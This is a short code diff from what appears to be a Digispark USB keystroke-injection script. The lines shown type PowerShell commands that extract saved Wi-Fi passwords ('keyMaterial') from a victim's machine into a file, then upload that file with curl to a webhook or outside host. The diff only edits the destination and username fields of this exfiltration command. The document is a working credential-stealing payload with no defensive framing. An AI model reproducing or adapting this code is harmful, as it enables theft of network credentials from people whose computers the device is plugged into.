@@ -13,7 +13,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.println("powershell Select-String -Path Wi-Fi-* -Pattern 'keyMaterial' > wifi");
   DigiKeyboard.delay(500);
-  DigiKeyboard.println("curl -i -H \"Expect:application/json\" -F file=@wifi -F \"payload_json={\\\"wait\\\":true,\\\"content\\\":\\\"passwords\\\",\\\"USERNAME\\\":\\\"pocketape.com\\\"}\" WEBHOOK");
+  DigiKeyboard.println("curl -i -H \"Expect:application/json\" -F file=@wifi -F \"payload_json={\\\"wait\\\":true,\\\"content\\\":\\\"passwords\\\",\\\"USERNAME\\\":\\\"USERNAME\\\"}\" pocketape.com");
   DigiKeyboard.delay(500);
   DigiKeyboard.println("exit");
   digitalWrite(1, HIGH); //led on
